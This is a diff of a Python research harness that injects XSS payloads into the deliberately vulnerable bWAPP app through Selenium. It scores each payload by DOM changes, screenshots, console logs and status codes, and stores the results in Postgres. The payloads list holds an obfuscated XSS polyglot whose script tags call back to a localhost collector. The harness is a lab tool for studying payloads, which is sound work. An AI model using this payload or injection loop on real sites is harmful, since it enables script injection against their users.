@@ -8,20 +8,7 @@ import psycopg2
 import cv2
 import numpy as np
 
-
 from bwapp_selenium_actions import *
-
-def print_diff(diff: DeepDiff):
-    print(diff.keys())
-    if 'iterable_item_removed' in diff:
-        print("---- ITEMS REMOVE EXPECTED ----")
-        print(diff['iterable_item_removed'].keys())
-    if 'iterable_item_added' in diff:
-        print("---- ITEMS ADD EXPECTED ----")
-        print(diff['iterable_item_added'].keys())
-    if 'values_changed' in diff:
-        print("---- ITEMS CHANGE EXPECTED ----")
-        print(diff['values_changed'].keys())
 
 '''
 :return result: a dict of sets with positions, where a diff appeared either in @diff_payload or @diff_expected; empty if both are equal
@@ -40,33 +27,49 @@ def compare_diffs(diff_payload: DeepDiff, diff_expected: DeepDiff):
             result[key] = set(diff_expected[key].keys())
     return result
 
+def rate_structure_diff(diff: dict) -> float:
+    if "iterable_item_removed" in diff:
+        if len(diff['iterable_item_removed']) != 0:
+            return 0.1
+    if "values_changed" in diff:
+        if len(diff['values_changed']) != 0:
+            return 0.3
+    if "iterable_item_added" in diff:
+        if len(diff['iterable_item_added']) != 0:
+            return 0.6
+    return 1
+
 def compare_images(img_str1, img_str2):
     img1 = cv2.imread(img_str1)
     img2 = cv2.imread(img_str2)
-    diff = np.sum((img1 - img2) ** 2) # calc medium squared error
-    print("IMAGES: ", diff)
+    return np.sum((img1 - img2) ** 2) # calc medium squared error
 
-def single_experiment(driver: webdriver, payloads: list[str], experiment_function: Callable[[webdriver, str, str], str]) -> any:
+def experiment_iteration(driver: webdriver, payloads: list[str], experiment_function: Callable[[webdriver, str, str], str]) -> any:
     # set login cookie for driver
-    login(driver, BWAPP_URL)
     driver.maximize_window()
+    login(driver, BWAPP_URL)
 
     # test which differences appear when the payload changes between "normal" strings
     uuid_1 = str(uuid.uuid4())
     uuid_2 = str(uuid.uuid4())
     while uuid_1 == uuid_2: uuid_1 = str(uuid.uuid4())
     html_uuid_1 = experiment_function(driver, BWAPP_URL, uuid_1)
-    driver.save_screenshot("out-" + "expected-1" + ".png")
+    driver.save_screenshot("tmp/expected-1.png")
     html_uuid_2 = experiment_function(driver, BWAPP_URL, uuid_2)
-    driver.save_screenshot("out-" + "expected-2" + ".png")
+    driver.save_screenshot("tmp/expected-2.png")
 
-    compare_images("out-expected-1.png", "out-expected-2.png")
+    expected_response_code = None
+    for req in reversed(driver.requests):
+        if ".php" in req.path:
+            expected_response_code = req.response.status_code
+            break
+
+    expected_img_diff = compare_images("tmp/expected-1.png", "tmp/expected-2.png")
 
     soup_uuid_1 = BeautifulSoup(html_uuid_1, "html.parser")
     soup_uuid_2 = BeautifulSoup(html_uuid_2, "html.parser")
 
     expected_diff = DeepDiff(soup_uuid_1, soup_uuid_2)
-    print_diff(expected_diff)
 
     conn = psycopg2.connect(
         host=DB_HOST,
@@ -78,39 +81,57 @@ def single_experiment(driver: webdriver, payloads: list[str], experiment_functio
 
     # generate diffs for each payload and compare to the expected diff, save differences
     for payload in payloads:
+        payload_str = str(payload)
         cursor = conn.cursor()
         cursor.execute("INSERT INTO xss_eval (payload, attacked_path) VALUES (%s, %s)",
-                    (payload, experiment_function.__name__))
+                    (payload_str, experiment_function.__name__))
         conn.commit()
-        cursor.execute("SELECT id, payload, attacked_path FROM xss_eval WHERE payload = %s AND attacked_path = %s ORDER BY id DESC", (payload, experiment_function.__name__))
+        cursor.execute("SELECT id, payload, attacked_path FROM xss_eval WHERE payload = %s AND attacked_path = %s ORDER BY id DESC", (payload_str, experiment_function.__name__))
         experiment_id = cursor.fetchone()[0]
-        payload = payload.replace("<id>", str(experiment_id))
-        print(payload)
-        html_payload = experiment_function(driver, BWAPP_URL, payload)
+        payload_str = payload_str.replace("<id>", str(experiment_id))
+
+        html_payload = experiment_function(driver, BWAPP_URL, payload_str)
         soup_payload = BeautifulSoup(html_payload, "html.parser")
         diff_payload = DeepDiff(soup_uuid_1, soup_payload)
-        result = compare_diffs(diff_payload, expected_diff)
+        structural_diff_to_expected = compare_diffs(diff_payload, expected_diff)
+        structural_score = rate_structure_diff(structural_diff_to_expected)
 
-        #driver = webdriver.Chrome()
+        driver.save_screenshot("tmp/" + str(experiment_id) + ".png")
+        img_diff = compare_images("tmp/expected-2.png", "tmp/" + str(experiment_id) + ".png")
 
-        driver.save_screenshot("out-" + str(experiment_id) + ".png")
-        compare_images("out-expected-1.png", "out-" + str(experiment_id) + ".png")
+        img_score = 1
+        if img_diff > 4 * expected_img_diff:
+            img_score = 0.1
+        if img_diff > 2 * expected_img_diff:
+            img_score = 0.5
 
-        print("LOGS: ", driver.get_log("browser"))
+        js_score = 1
+        console_out = driver.get_log("browser")
+        if len(console_out) != 0:
+            js_score = 0.1
+
+        response_code_score = 1
         for req in reversed(driver.requests):
             if ".php" in req.path:
-                print("CODE: ", req.response.status_code)
+                if expected_response_code != req.response.status_code:
+                    response_code_score = 0.1
                 break
 
-        cursor.execute("UPDATE xss_eval SET impact = %s WHERE id = %s", (str(result), experiment_id))
-        conn.commit()
-        print(result)
+        overall_score = structural_score * img_score * js_score * response_code_score
 
-    driver.quit()
+        cursor.execute("UPDATE xss_eval "
+                       "SET structural_impact = %s, console_out = %s, structural_score = %s, img_score = %s, js_score = %s, "
+                       "response_code_score = %s, overall_score = %s "
+                       "WHERE id = %s",
+                       (str(structural_diff_to_expected), str(console_out), structural_score, img_score, js_score, response_code_score,
+                        overall_score, experiment_id)
+                       )
+        conn.commit()
 
 payloads = ["\"<ScRiPt sRc=`http://localhost:5000/submit/<id>`></ScRiPt>nOeMbed><ScRiPt sRc='http://localhost:5000/submit/<id>'></ScRiPt>\"&gt;import(`http://localhost:5000/submit/<id>`) <!--hTmL>' oNLoAd= )texTarEa&gt;<iMg-<ScRiPt sRc=`http://localhost:5000/submit/<id>`></ScRiPt> oNFoCus=*/';/ifRaMe>hTmL> oNtOgGle=/*`>/sOurCe&gt; oNmOuSeLeaVe= > OnBlUr= <ScRiPt sRc='http://localhost:5000/submit/<id>'></ScRiPt>iMg/* onClICk=import(\"http://localhost:5000/submit/<id>\")", "sane"]
 
 if __name__ == '__main__':
     driver = webdriver.Chrome()
+    #payloads = [generate_payload() for _ in range(1, 50)]
     #single_experiment(driver, payloads, xss_reflected_eval)
-    single_experiment(driver, payloads, xss_reflected_get_firstname)
+    experiment_iteration(driver, payloads, xss_reflected_get_firstname)
